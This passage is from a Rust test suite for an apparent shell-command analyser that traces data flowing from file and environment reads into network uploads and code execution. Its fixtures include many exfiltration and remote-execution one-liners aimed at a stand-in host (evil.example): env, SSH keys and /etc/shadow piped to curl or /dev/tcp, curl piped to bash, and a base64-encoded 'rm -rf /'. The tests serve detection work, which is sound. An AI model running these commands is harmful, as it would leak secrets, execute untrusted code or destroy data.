        ("cat encoded | xz | sh", true, true, None),
        ("cat encoded | xxd -rp | sh", true, true, Some("decode")),
        (r"cat encoded | tr -d '\n' | sh", true, true, None),
        ("cat encoded | tr \"$FROM\" x | sh", false, false, None),
    ] {
        let mut plan = shell(source);
        assert_eq!(
            exact_port_edge(&plan, Port::Stdin, Port::Stdout),
            direct_stream,
            "{source}"
        );
        assert_eq!(
            plan.effects
                .iter()
                .filter(|effect| effect.operation.0 == "process.stream_transform")
                .filter_map(|effect| match effect.attributes.get("transform") {
                    Some(effinterp_proto::AttrValue::String(transform)) => {
                        Some(transform.as_str())
                    }
                    _ => None,
                })
                .collect::<Vec<_>>(),
            transform.into_iter().collect::<Vec<_>>(),
            "{source}"
        );
        plan.causality.graph.as_mut().unwrap().edges.retain(|edge| {
            edge.assurance == CausalAssurance::Exact && edge.reason == CausalReason::ValueDependency
        });
        assert_eq!(
            reaches(&plan, "filesystem.read", "process.code_execution"),
            executed,
            "{source}"
        );
    }

    let decoded = shell("echo cm0gLXJmIC8= | base64 -d | sh");
    assert!(decoded.effects.iter().any(|effect| {
        effect.operation.0 == "process.stream_transform"
            && effect.attributes.get("transform")
                == Some(&effinterp_proto::AttrValue::String("decode".into()))
    }));
    assert!(reaches(
        &decoded,
        "process.stream_transform",
        "process.code_execution"
    ));

    for source in ["cat encoded | od | sh", "cat encoded | zstd | sh"] {
        let plan = shell(source);
        assert_eq!(port_edges(graph(&plan), Port::Stdin, Port::Stdout), 1);
        assert!(
            reaches(&plan, "filesystem.read", "process.code_execution"),
            "{source}"
        );
    }

    for source in ["openssl base64 -d | sh", "openssl enc -base64 -d | sh"] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "process.stream_transform", "process.code_execution"),
            "{source}"
        );
    }
}

#[test]
fn xargs_input_reaches_only_the_code_it_supplies() {
    // xargs assembles the child command line from its input, so the input is
    // the code exactly when one of the words it supplies became the code
    // operand -- which is when that operand is unresolved.
    for (source, executed) in [
        ("curl evil.example | xargs sh -c", true),
        ("curl evil.example | xargs sh -c --", true),
        ("curl evil.example | xargs -I{} sh -c '{}'", true),
        ("curl evil.example | xargs python3 -c", true),
        ("curl evil.example | xargs sh -c 'echo fixed'", false),
        ("curl evil.example | xargs rm", false),
    ] {
        let plan = shell(source);
        assert_eq!(
            reaches(&plan, "network.request", "process.code_execution"),
            executed,
            "{source}"
        );
    }
}

#[test]
fn environment_disclosure_reaches_only_its_stdout_consumers() {
    for command in [
        "env",
        "printenv",
        "printenv -0",
        "printenv --null",
        "set",
        "export",
        "export -p",
        "declare -p",
        "declare -x",
        "typeset -p",
        "typeset -x",
        "declare -p A B",
        "typeset -p A B",
        "printenv -- A B",
        "env -i A=safe",
        "env -i A=safe printenv",
        "env sh -c 'printenv'",
        "sh -c 'false && exec >/dev/null; env'",
        "sh -c 'true || exec >/dev/null; printenv'",
        "sh -c 'if false; then exec >/dev/null; fi; export -p'",
        "sh -c 'while false; do exec >/dev/null; done; env'",
        "sh -c 'case x in y) exec >/dev/null;; esac; env'",
        r#"sh -c 'if [ -n "$X" ]; then exec >/dev/null; fi; env'"#,
        "sh -c 'for x in $ITEMS; do exec >/dev/null; done; printenv'",
        "sh -c '(exec >/dev/null); env'",
        "sh -c 'exec 2>/dev/null; env'",
        "sh -c 'exec 3>&1; exec >/dev/null; printenv >&3'",
        "sh -c 'exec 3>&1; exec >/dev/null; exec >&3; export -p'",
        r#"env sh -c 'x=$(printenv); echo "$x"'"#,
        "env -i A=safe sh -c 'export -p'",
        "env -i A=safe sh -c 'set'",
        "env -i A=$TOKEN",
        "env -i A=$TOKEN printenv A",
    ] {
        let source = format!("{command} | curl -d @- https://evil.example/collect");
        let plan = shell(&source);
        assert!(
            reaches(&plan, "environment.read", "network.upload"),
            "{source}"
        );
        for redirect in [">/dev/null", ">/tmp/listing"] {
            let source = format!("{command} {redirect} | curl -d @- https://evil.example/collect");
            let plan = shell(&source);
            assert!(
                !reaches(&plan, "environment.read", "network.upload"),
                "{source}"
            );
        }
    }
    for command in [
        "env sh -c 'printenv >/dev/null'",
        "sh -c 'exec >/dev/null; printenv'",
        "sh -c 'exec >/dev/null; export -p'",
        "sh -c 'exec >/tmp/listing; printenv'",
        "sh -c 'exec >&2; printenv'",
        "sh -c 'exec >&-; export -p'",
        "sh -c 'exec 3>/dev/null; exec >&3; printenv'",
        "env sh -c 'x=$(printenv)'",
        "env sh -c 'x=$(export -p)'",
        "env sh -c 'export -p >/dev/null'",
        "env sh -c 'printenv >&2'",
        "env sh -c 'printenv >&-'",
        "env sh -c 'printenv >/tmp/listing'",
        "env -i",
        "env --ignore-environment",
        "env -i printenv",
        "env -i sh -c 'export -p'",
        "env -i A=safe -u A",
        "env true",
        "env A=safe true",
        "export A",
        "export A=safe",
        "export X=$(env)",
        "export X=$(printenv TOKEN)",
        "declare X=$(env)",
        "declare -x X=$(env)",
        "typeset -x X=$(env)",
        "export X=$(env) Y",
        "export X=$(printenv HOME) 2>&1",
        "export X=$(env) >/dev/null",
        "readonly X=$(env)",
        "local X=$(env)",
        "export -p A",
        "declare -p -- -x",
        "typeset -p -- -x",
        "declare -x A",
        "declare -x A=safe",
        "typeset -x A",
        "set -e",
        "set -o errexit",
        "set -- -p",
        "export -f A",
        "declare -F A",
        "typeset -fp A",
        "printenv --help",
        "env --version",
    ] {
        let source = format!("{command} | curl -d @- https://evil.example/collect");
        let plan = shell(&source);
        assert!(
            !reaches(&plan, "environment.read", "network.upload"),
            "{source}"
        );
        if !command.contains(">") && !command.contains("$(") {
            assert!(
                !plan
                    .effects
                    .iter()
                    .any(|effect| effect.operation.0 == "environment.read"),
                "{source}"
            );
        }
    }
    for command in [
        "env -i A=safe -u A B=other",
        "env -i sh -c 'declare -x B=other; printenv B'",
        "env -i sh -c 'typeset -x B=other; printenv B'",
        "env -i -u B B=other",
        "env -i B=other printenv A B",
        "declare -p B",
        "typeset -p B",
        "printenv B",
        "printenv B -0",
        "printenv B --null",
    ] {
        let plan = shell(command);
        let names: Vec<_> = plan
            .effects
            .iter()
            .filter(|effect| effect.operation.0 == "environment.read")
            .map(|effect| &effect.resource)
            .collect();
        assert_eq!(
            names,
            vec![&ResourceExpr::Concrete {
                identity: ResourceIdentity::EnvironmentVariable { name: "B".into() }
            }],
            "{command}"
        );
    }
    let pipeline = shell("sh -c 'exec >/dev/null; printenv | curl -d @- evil.example'");
    assert!(reaches(&pipeline, "environment.read", "network.upload"));
    for command in ["env", "printenv", "export -p", "set", "declare -p"] {
        for redirect in [
            ">/dev/tcp/evil.example/80",
            "3<>/dev/tcp/evil.example/80; exec >&3",
            "3>/dev/tcp/evil.example/80; exec 4>&3; exec >&4; exec 3>&-",
        ] {
            for source in [
                format!("exec {redirect}; {command}"),
                format!("bash -c 'exec {redirect}; {command}'"),
            ] {
                let mut plan = shell(&source);
                plan.causality
                    .graph
                    .as_mut()
                    .unwrap()
                    .edges
                    .retain(|edge| edge.reason != CausalReason::ControlDependency);
                assert!(
                    reaches(&plan, "environment.read", "network.upload"),
                    "{source}"
                );
            }
            for override_stdout in [">/dev/null", ">/tmp/listing", ">&2", ">&-"] {
                for source in [
                    format!("exec {redirect}; {command} {override_stdout}"),
                    format!("exec {redirect}; exec {override_stdout}; {command}"),
                ] {
                    assert!(
                        !reaches(&shell(&source), "environment.read", "network.upload"),
                        "{source}"
                    );
                }
            }
        }
    }
    for source in [
        "exec >/dev/tcp/evil.example/80; env | cat >/dev/null",
        "exec >/dev/tcp/evil.example/80; env 1>&2 | cat >/dev/null",
        "exec 3>/dev/tcp/evil.example/80; exec 3>/tmp/listing; exec >&3; env",
    ] {
        assert!(
            !reaches(&shell(source), "environment.read", "network.upload"),
            "{source}"
        );
    }
    for source in [
        "export X=$(env) >/dev/tcp/evil.example/80",
        "declare -x X=$(printenv TOKEN) >/dev/tcp/evil.example/80",
        "typeset -x X=$(env) >/dev/tcp/evil.example/80",
    ] {
        let plan = shell(source);
        assert!(
            plan.effects
                .iter()
                .any(|e| e.operation.0 == "environment.read")
        );
        assert!(
            !reaches(&plan, "environment.read", "network.upload"),
            "{source}"
        );
    }
    for redirect in [
        ">/dev/tcp/evil.example/80",
        "3>/dev/tcp/evil.example/80; exec >&3",
        ">>/var/log/install.log 2>&1",
    ] {
        let sink = if redirect.contains("/dev/tcp/") {
            "network.upload"
        } else {
            "filesystem.write"
        };
        let reaches_destination = |plan: &Plan| {
            let destination = &plan
                .effects
                .iter()
                .find(|e| e.operation.0 == sink)
                .unwrap()
                .resource;
            let graph = graph(plan);
            let targets = graph
                .nodes
                .iter()
                .filter_map(|node| match &node.occurrence {
                    OccurrenceKind::ResourceInteraction {
                        operation,
                        resource,
                        ..
                    } if operation.0 == sink && resource == destination => Some(node.id.clone()),
                    _ => None,
                })
                .collect();
            graph.nodes.iter().any(|node| {
                matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0 == "environment.read")
                    && reaches_from(graph, node.id.clone(), &targets)
            })
        };
        for captured in [
            "export X=$(env)",
            r#"export X="$(env)""#,
            "export X=$(printenv HOME)",
            "declare -x X=$(env)",
            "typeset -x X=$(env)",
            "declare X=$(env)",
            "export TOKEN=$(printenv TOKEN)",
            r#"declare -x TOKEN="$(printenv TOKEN)""#,
            "x=$(env)",
            "x=$(printenv HOME)",
            "x=$(export -p)",
            "x=`env`",
            r#": "$(env)""#,
            "x=$(env | grep AWS)",
            r#"[ -n "$(env)" ]"#,
            r#"cat <<<"$(env)" >/dev/null"#,
            r#"echo "$(env)" >/dev/null"#,
            "x=$(env) >/dev/null",
            "f() { env; }; x=$(f)",
            "x=$(eval env)",
            "x=$(sh -c env)",
            "x=$(x=$(env))",
            "x=$(env >&1)",
        ] {
            for source in [
                format!("exec {redirect}; {captured}"),
                format!("bash -c 'exec {redirect}; {captured}'"),
            ] {
                let plan = shell(&source);
                assert!(
                    plan.effects
                        .iter()
                        .any(|e| e.operation.0 == "environment.read"),
                    "{source}"
                );
                assert!(!reaches_destination(&plan), "{source}");
            }
        }
        for emitted in [
            "export X=$(env); printenv X",
            "declare -x X=$(env); printenv X",
            "typeset -x X=$(env); printenv X",
            r#"declare X=$(env); echo "$X""#,
            "exec 3>&1; export X=$(env >&3)",
            "exec 2>&1; declare -x X=$(env >&2)",
            r#"x=$(env); echo "$x""#,
            r#"echo "$(printenv HOME)""#,
            "exec 3>&1; x=$(env >&3)",
            "exec 2>&1; x=$(env >&2)",
            "x=$(exec 1>&2; env)",
        ] {
            // The last case needs stderr explicitly copied from the destination.
            let source = format!("exec {redirect}; exec 2>&1; {emitted}");
            let mut plan = shell(&source);
            plan.causality
                .graph
                .as_mut()
                .unwrap()
                .edges
                .retain(|edge| edge.reason != CausalReason::ControlDependency);
            assert!(reaches_destination(&plan), "{source}");
        }
    }
    for source in [
        "x=$(env) >/dev/tcp/evil.example/80",
        "exec >/dev/tcp/evil.example/80; cat <(env) >/dev/null",
    ] {
        assert!(
            !reaches(&shell(source), "environment.read", "network.upload"),
            "{source}"
        );
    }
    for open in ["3>/dev/tcp/evil.example/80", "3<>/dev/tcp/evil.example/80"] {
        for consumer in ["env", "printenv", "cat /etc/passwd | cat"] {
            for source in [
                format!("exec {open}; {consumer} >&3"),
                format!(r#"if [ -n "$H" ]; then exec {open}; {consumer} >&3; fi"#),
                format!(r#"[ -n "$H" ] && exec {open}; {consumer} >&3"#),
                format!(r#"if [ -n "$H" ]; then exec {open}; fi; {consumer} >&3"#),
                format!("exec {open}; test -n \"$H\" && exec 3>&-; {consumer} >&3"),
            ] {
                let mut plan = shell(&source);
                assert_eq!(
                    plan.effects
                        .iter()
                        .filter(|effect| effect.operation.0 == "network.upload")
                        .count(),
                    2,
                    "{source}"
                );
                plan.causality
                    .graph
                    .as_mut()
                    .unwrap()
                    .edges
                    .retain(|edge| edge.reason != CausalReason::ControlDependency);
                let operation = if consumer.starts_with("cat ") {
                    "filesystem.read"
                } else {
                    "environment.read"
                };
                assert!(reaches(&plan, operation, "network.upload"), "{source}");
                let redirected = source.replace(
                    &format!("{consumer} >&3"),
                    &format!("{consumer} >&3 >/dev/null"),
                );
                assert!(
                    !reaches(&shell(&redirected), operation, "network.upload"),
                    "{redirected}"
                );
            }
        }
    }
    for (command, resolved) in [
        ("sh -c 'false && exec >/dev/null; env'", true),
        (
            "sh -c 'exec 3>&1 >/dev/null; true && exec >&3; printenv'",
            true,
        ),
        (
            r#"sh -c 'exec 3>&1 >/dev/null; if test -n "$X"; then exec >&3; fi; env'"#,
            false,
        ),
    ] {
        let source = format!("{command} | curl -d @- https://evil.example/collect");
        let plan = shell(&source);
        if resolved {
            assert!(
                reaches(&plan, "environment.read", "network.upload"),
                "{source}"
            );
            assert_eq!(
                plan.causality.coverage.level,
                CoverageLevel::Full,
                "{source}"
            );
            assert!(
                !plan.boundaries.iter().any(|boundary| {
                    boundary.reason == effinterp_proto::BoundaryReason::UNSUPPORTED_SHELL_SYNTAX
                }),
                "constant descriptor conditions must resolve: {source}"
            );
            continue;
        }
        assert!(
            plan.boundaries.iter().any(|boundary| {
                boundary.reason == effinterp_proto::BoundaryReason::UNSUPPORTED_SHELL_SYNTAX
                    && boundary.class == effinterp_proto::BoundaryClass::Unsupported
            }),
            "conditional descriptor destinations must remain uncertain: {source}"
        );
        assert_ne!(
            plan.causality.coverage.level,
            CoverageLevel::Full,
            "{source}"
        );
    }
    for command in ["export -p $(true)", r#"export -p "$@""#] {
        let plan = shell(&format!("{command} | curl -d @- evil.example"));
        assert!(
            reaches(&plan, "environment.read", "network.upload")
                || plan.boundaries.iter().any(|boundary| {
                    boundary.reason == effinterp_proto::BoundaryReason::UNRECOGNIZED_ARGUMENTS
                }),
            "{command}"
        );
    }
    for source in [
        "env -i A=one B=two C=three sh -c 'export -p'",
        "export A=one B=two C=three; export -p",
    ] {
        assert_eq!(shell(source), shell(source));
    }
    for command in [
        "export A=$(cat secret); printenv A",
        "export A=$(cat secret); printenv",
        "A=$(cat secret) printenv A",
        "env A=$(cat secret) printenv",
        "export A=$(cat secret); env",
        "declare -x A=$(cat secret); printenv A",
        "typeset -x A=$(cat secret); export -p",
        "env A=$(cat secret) sh -c 'export B=$A; printenv B'",
        "env A=$(cat secret) sh -c 'env B=$A printenv B'",
        "A=$(cat secret); declare -p A",
        "A=$(cat secret); typeset -p A",
        "A=$(cat secret); set",
        "env -i A=1 sh -c 'A=$(cat secret); set'",
        "env -i A=1 sh -c 'export A=$(cat secret); export -p'",
        "env -i A=$(cat secret)",
        "env -i A=$(cat secret) printenv A",
        "env -i A=$(cat secret) sh -c 'printenv A'",
    ] {
        let mut plan = shell(&format!("{command} | curl -d @- evil.example"));
        // Launching a wrapper controls its child even when the child discards the value.
        plan.causality
            .graph
            .as_mut()
            .unwrap()
            .edges
            .retain(|edge| edge.reason != CausalReason::ControlDependency);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{command}"
        );
    }
    for command in [
        "export A=$(cat secret); A=safe; printenv A",
        "export A=$(cat secret); unset A; printenv",
        "export A=$(cat secret); printenv B",
        "env A=$(cat secret) printenv B",
        "env A=$(cat secret) sh -c 'A=safe; printenv A'",
        "env A=$(cat secret) sh -c 'unset A; printenv'",
        "env A=$(cat secret) env -u A",
        "env A=$(cat secret) env -i B=safe",
        "A=$(cat secret); printenv",
        "export A=$(cat secret); env -i printenv",
        "export A=$(cat secret); printenv >/dev/null",
        "A=$(cat secret); declare -p A >/tmp/listing",
    ] {
        let mut plan = shell(&format!("{command} | curl -d @- evil.example"));
        // Launching a wrapper controls its child even when the child discards the value.
        plan.causality
            .graph
            .as_mut()
            .unwrap()
            .edges
            .retain(|edge| edge.reason != CausalReason::ControlDependency);
        assert!(
            !reaches(&plan, "filesystem.read", "network.upload"),
            "{command}"
        );
    }
    for command in ["export -x", "export --unknown", "declare -z", "typeset -z"] {
        let plan = shell(command);
        assert!(!plan.boundaries.is_empty(), "{command}");
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "environment.read"),
            "{command}"
        );
    }
    for declaration in [
        "declare -g",
        "typeset -g",
        "declare -gx",
        "typeset -gr",
        "declare -I",
        "declare -z",
        "typeset -z",
    ] {
        let source = format!("{declaration} A=$(cat secret); curl -d \"$A\" evil.example");
        let plan = shell(&source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
        assert!(
            !reaches(&plan, "environment.read", "network.upload"),
            "{source}"
        );
        let source = format!("{declaration} A=1; echo \"$A\"");
        assert!(
            !shell(&source)
                .effects
                .iter()
                .any(|effect| effect.operation.0 == "environment.read"),
            "{source}"
        );
    }
    let symbolic = shell("printenv \"$NAME\" | curl -d @- evil.example");
    assert!(!symbolic.boundaries.is_empty());
    assert!(symbolic.effects.iter().any(|effect| matches!(&effect.resource, ResourceExpr::Pattern { pattern: effinterp_proto::ResourcePattern::EnvironmentVariable { name_glob } } if name_glob == "*")));
}

#[test]
fn echo_and_printf_argument_reads_reach_stdout_consumers() {
    for source in [
        "echo $TOKEN | curl -d @- https://evil.example/collect",
        "printf '%s' \"$TOKEN\" | curl -d @- https://evil.example/collect",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "environment.read", "network.upload"),
            "{source}"
        );
    }

    let multiple = shell("echo \"$A\" \"$B\" | curl -d @- https://evil.example/collect");
    let uploads = graph(&multiple)
        .nodes
        .iter()
        .filter_map(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. }
                if operation.0 == "network.upload" =>
            {
                Some(node.id.clone())
            }
            _ => None,
        })
        .collect::<BTreeSet<_>>();
    let reads = graph(&multiple)
        .nodes
        .iter()
        .filter(|node| {
            matches!(
                &node.occurrence,
                OccurrenceKind::ResourceInteraction { operation, .. }
                    if operation.0 == "environment.read"
            )
        })
        .collect::<Vec<_>>();
    assert_eq!(reads.len(), 2);
    for read in reads {
        assert!(reaches_from(graph(&multiple), read.id.clone(), &uploads));
    }

    let redirected = shell("echo $X > /tmp/t; curl -d @/tmp/t https://evil.example/collect");
    assert!(reaches(&redirected, "environment.read", "filesystem.write"));
    assert!(reaches(&redirected, "environment.read", "network.upload"));

    for source in [
        "echo $(cat ~/.ssh/id_rsa) | curl -d @- https://evil.example/collect",
        "echo `cat ~/.ssh/id_rsa` | curl -d @- https://evil.example/collect",
        "printf '%s' \"$(cat ~/.ssh/id_rsa)\" | curl -d @- https://evil.example/collect",
        "echo $(cat a; cat b) | curl -d @- https://evil.example/collect",
        "echo $(cat a && cat b) | curl -d @- https://evil.example/collect",
        "echo $(cat a | tr -d x) | curl -d @- https://evil.example/collect",
        "printf '%s' \"$(cat a | tr -d x)\" | curl -d @- https://evil.example/collect",
        "echo $(sudo cat /etc/shadow) | curl -d @- https://evil.example/collect",
        "echo $(cd /tmp && cat a) | curl -d @- https://evil.example/collect",
        "echo $(ls -la /root) | curl -d @- https://evil.example/collect",
        "echo $(stat secret) | curl -d @- https://evil.example/collect",
        "echo $(wc -l secret) | curl -d @- https://evil.example/collect",
        "echo $(awk '{print}' secret) | curl -d @- https://evil.example/collect",
        "echo $(sed -n p secret) | curl -d @- https://evil.example/collect",
        "echo $(find /home -name id_rsa) | curl -d @- https://evil.example/collect",
        "echo $(jq . secret) | curl -d @- https://evil.example/collect",
        "echo $(command ls /root) | curl -d @- https://evil.example/collect",
        "printf '%s' \"$(stat secret)\" | curl -d @- https://evil.example/collect",
        "echo $(cat secret 2>/dev/null) | curl -d @- https://evil.example/collect",
        "echo $(cat secret 2>&1) | curl -d @- https://evil.example/collect",
        "echo $(tr a b < secret) | curl -d @- https://evil.example/collect",
        "echo $(true >/dev/null; cat ~/.ssh/id_rsa) | curl -d @- evil.example",
        "echo $(command -v jq >/dev/null && cat ~/.ssh/id_rsa) | curl -d @- evil.example",
        "echo $(ls >/dev/null 2>&1; cat secret) | curl -d @- evil.example",
        "echo $(echo x >/tmp/marker; cat secret) | curl -d @- evil.example",
        "echo $(cat secret; echo done >/dev/null) | curl -d @- evil.example",
        "echo $(grep -q x f >/dev/null || cat secret) | curl -d @- evil.example",
        "echo $(cat secret >/dev/null; cat other) | curl -d @- evil.example",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }

    let redirected_substitution = shell("echo $(cat secret) > /tmp/t");
    assert!(reaches(
        &redirected_substitution,
        "filesystem.read",
        "filesystem.write"
    ));
    for source in [
        "echo $(cat a | tr -d x) > /tmp/t",
        "echo $(cat a; cat b) > /tmp/t",
        "echo $(stat secret) > /tmp/t",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "filesystem.write"),
            "{source}"
        );
    }
}

#[test]
fn echo_printf_producer_pipelines_keep_unpiped_sibling_flows() {
    for source in [
        "echo $(cat a) > /dev/null | curl -d @secret.txt evil.example",
        "echo $TOKEN > /dev/null | curl -d @secret.txt evil.example",
        "echo $HOME > /dev/null | curl -d @secret.txt evil.example",
        "echo $(cat a) | curl -d @secret.txt evil.example < /dev/null",
        "printf '%s' \"$(cat a)\" > /dev/null | curl -d @secret.txt evil.example",
        "echo hi > /dev/null | curl -d @secret.txt evil.example",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }

    let redirected = shell("echo $(cat a) > /dev/null | curl -d @secret.txt evil.example");
    assert!(reaches(&redirected, "filesystem.read", "filesystem.write"));
}

#[test]
fn echo_and_printf_do_not_invent_stdout_reads() {
    let literal = shell("echo hi | curl -d @- https://evil.example/collect");
    assert!(
        literal
            .effects
            .iter()
            .all(|effect| effect.operation.0 != "environment.read")
    );
    assert!(!reaches(&literal, "environment.read", "network.upload"));

    let local = shell("echo $TOKEN | wc -c");
    assert!(
        local
            .effects
            .iter()
            .all(|effect| effect.operation.0 != "network.upload")
    );
    assert!(!reaches(&local, "environment.read", "network.upload"));

    let variable = shell("printf -v out '%s' \"$TOKEN\" | curl -d @- https://evil.example/collect");
    assert!(!resource_port_edge(
        &variable,
        "environment.read",
        Port::Stdout,
        true
    ));
    assert!(!reaches(&variable, "environment.read", "network.upload"));

    for source in [
        "echo hi 2>\"$LOG\" | curl -d @- https://evil.example/collect",
        "printf '%s' hi 2>\"$LOG\" | curl -d @- https://evil.example/collect",
        "echo hi < \"$SRC\" | curl -d @- https://evil.example/collect",
    ] {
        let redirected = shell(source);
        assert!(
            !reaches(&redirected, "environment.read", "network.upload"),
            "{source}"
        );
    }

    let redirect_target = shell("echo hi > \"$OUT\"");
    assert!(!reaches(
        &redirect_target,
        "environment.read",
        "filesystem.write"
    ));

    for source in [
        "echo $(date) | curl -d @- https://evil.example/collect",
        "echo $(cat f); curl -d @- https://evil.example/collect",
        "echo $(cat f >/dev/null) | curl -d @- https://evil.example/collect",
        "echo $(cat f 1>&2) | curl -d @- https://evil.example/collect",
        "echo $(cat f >/dev/null; echo done) | curl -d @- https://evil.example/collect",
    ] {
        let plan = shell(source);
        assert!(
            !reaches(&plan, "filesystem.read", "network.upload"),
            "{source}"
        );
    }
}

#[test]
fn echo_and_printf_redirected_stdout_does_not_alias_other_commands() {
    for source in [
        "curl -d @/w/f https://e.example/c; echo $X > /tmp/t",
        "echo $X > /tmp/t; curl -d @/w/f https://e.example/c",
        "cat /w/secret | curl -d @- https://e.example/c; echo $X > /tmp/t",
        "printf '%s' \"$X\" > /tmp/t; cat /w/secret | curl -d @- https://e.example/c",
    ] {
        let plan = shell(source);
        assert!(
            reaches(&plan, "environment.read", "filesystem.write"),
            "{source}"
        );
        assert!(
            !reaches(&plan, "filesystem.read", "filesystem.write"),
            "{source}"
        );
        assert!(
            !reaches(&plan, "network.upload", "filesystem.write"),
            "{source}"
        );
    }

    for source in [
        "exec {fd}>/tmp/t; echo $X | curl -d @- https://evil.example/collect",
        "echo $X {fd}>/tmp/t | curl -d @- https://evil.example/collect",
        "out=$(echo $X {fd}>/tmp/t); echo \"$out\" | curl -d @- https://evil.example/collect",
    ] {
        let plan = shell(source);
        assert!(
            !reaches(&plan, "environment.read", "filesystem.write"),
            "{source}"
        );
        assert!(
            reaches(&plan, "environment.read", "network.upload"),
            "{source}"
        );
    }

    let headline = shell("echo $X > /tmp/t; curl -d @/tmp/t https://evil.example/collect");
    assert!(reaches(&headline, "environment.read", "filesystem.write"));
    assert!(reaches(&headline, "environment.read", "network.upload"));
    assert!(!reaches(&headline, "filesystem.read", "filesystem.write"));
    assert!(!reaches(&headline, "network.upload", "filesystem.write"));
    assert!(!reaches(&headline, "network.upload", "filesystem.read"));
}

#[test]
fn heredoc_stdin_values_reach_writes_and_interpreter_effects() {
    for source in [
        "cat <<EOF > /etc/motd\nhi\nEOF",
        "sudo tee /etc/x <<EOF\nhi\nEOF",
    ] {
        let plan = shell(source);
        assert!(
            reaches_from_value(&plan, "hi\n", "filesystem.write"),
            "{source:?}"
        );
    }

    let python = shell("python3 - <<PY\nimport shutil; shutil.rmtree(\"/tmp/heredoc-flow\")\nPY");
    assert!(reaches_from_value(
        &python,
        "import shutil; shutil.rmtree(\"/tmp/heredoc-flow\")\n",
        "filesystem.delete"
    ));
}

#[test]
fn curl_pipe_bash_connects_response_to_code_occurrence() {
    let plan = shell("curl example.com | bash");
    assert_eq!(port_edges(graph(&plan), Port::Stdout, Port::Stdin), 1);
    assert!(port_edges(graph(&plan), Port::Stdin, Port::Code) >= 1);
    assert!(resource_port_edge(
        &plan,
        "process.code_execution",
        Port::Code,
        false
    ));
    assert!(reaches(&plan, "network.request", "process.code_execution"));
    assert!(
        plan.boundaries
            .iter()
            .any(|boundary| boundary.reason.as_str() == "dynamic_source")
    );
}

#[test]
fn system_program_path_keeps_its_model_flow() {
    let plan = shell("/usr/bin/curl example.com | /bin/bash");
    assert!(reaches(&plan, "network.request", "process.code_execution"));
}

#[test]
fn process_substitution_descriptor_reaches_sourced_and_prefixed_exec_code() {
    for src in [
        "exec 3< <(curl example.com); source /dev/fd/3",
        "exec 3< <(curl example.com); . /proc/self/fd/3",
        "command -p command -- exec 3< <(curl example.com); bash <&3",
        "exec 3< <(curl example.com); bash /proc/thread-self/root/proc/self/fd/3",
    ] {
        let plan = shell(src);
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{src:?}"
        );
    }
}

#[test]
fn descriptor_reads_carry_their_producer_into_eval() {
    for src in [
        "exec 3< <(curl example.com); read cmd <&3; eval \"$cmd\"",
        "exec 3< <(curl example.com); mapfile -u 3 rows; eval \"${rows[0]}\"",
        "exec 3< <(curl example.com); readarray -u3 rows; eval \"${rows[@]}\"",
    ] {
        let plan = shell(src);
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{src:?}"
        );
    }
    // A reassigned array no longer holds the downloaded lines.
    let plan =
        shell("exec 3< <(curl example.com); mapfile -u 3 rows; rows=(ls); eval \"${rows[0]}\"");
    assert!(!reaches(&plan, "network.request", "process.code_execution"));
}

#[test]
fn here_string_and_heredoc_values_reach_stdin_code() {
    for src in [
        "CODE=$(curl example.com); bash <<< \"$CODE\"",
        "bash <<EOF\n$(curl example.com)\nEOF",
    ] {
        let plan = shell(src);
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{src:?}"
        );
    }
    // Code from an argument does not read the here-string.
    let plan = shell("CODE=$(curl example.com); bash -c 'echo hi' <<< \"$CODE\"");
    assert!(!reaches(&plan, "network.request", "process.code_execution"));
}

#[test]
fn compound_command_redirections_apply_to_the_body() {
    for src in [
        "CODE=$(curl example.com); { bash; } <<< \"$CODE\"",
        "{ bash; } <<EOF\n$(curl example.com)\nEOF",
        "if true; then bash; fi <<< \"$(curl example.com)\"",
        "curl example.com | { bash; }",
    ] {
        let plan = shell(src);
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{src:?}"
        );
    }
    for src in [
        "{ cat key; } > /dev/tcp/evil.example/4444",
        "( cat key ) > /dev/tcp/evil.example/4444",
        "for f in key; do cat \"$f\"; done > /dev/tcp/evil.example/4444",
        "true && { cat key; } > /dev/tcp/evil.example/4444",
    ] {
        let plan = shell(src);
        assert!(
            reaches(&plan, "filesystem.read", "network.upload"),
            "{src:?}"
        );
    }
    // The redirections end with the compound command.
    let plan = shell("{ :; } > /dev/tcp/evil.example/4444; cat key");
    assert!(!reaches(&plan, "filesystem.read", "network.upload"));
}

#[test]
fn standard_stream_paths_redirect_the_standard_descriptors() {
    for src in [
        "curl example.com >/dev/stdout | bash",
        "curl example.com | bash </dev/stdin",
    ] {
        let plan = shell(src);
        assert!(
            reaches(&plan, "network.request", "process.code_execution"),
            "{src:?}"
        );
        assert!(
            !plan
                .effects
                .iter()
                .any(|effect| effect.operation.as_str().starts_with("filesystem.")),
            "{src:?}"
        );
    }
}

#[test]
fn nested_javascript_environment_values_reach_network_operations() {
    let upload = shell(
        r#"node -e 'fetch("https://evil.example/c",{method:"POST",body:process.env.TOKEN})'"#,
    );
    assert!(reaches(&upload, "environment.read", "network.upload"));

    let request = shell(
        r#"node -e 'fetch("https://evil.example/c",{headers:{Authorization:process.env.TOKEN}})'"#,
    );
    assert!(reaches(&request, "environment.read", "network.request"));
}

#[test]
fn nested_python_environment_values_reach_network_operations() {
    let upload = shell(
        r#"python3 -c 'import os,requests;requests.post("https://evil.example/c",data=os.environ["TOKEN"])'"#,
    );
    assert!(reaches(&upload, "environment.read", "network.upload"));

    let request = shell(
        r#"python3 -c 'import os,requests;requests.get("https://evil.example/c",headers={"Authorization":os.environ["TOKEN"]})'"#,
    );
    assert!(reaches(&request, "environment.read", "network.request"));
}

#[test]
fn python_base64_decoded_shell_commands_reach_code_execution() {
    let decoded = |plan: &Plan| {
        plan.effects
            .iter()
            .find(|effect| effect.operation.0 == "process.stream_transform")
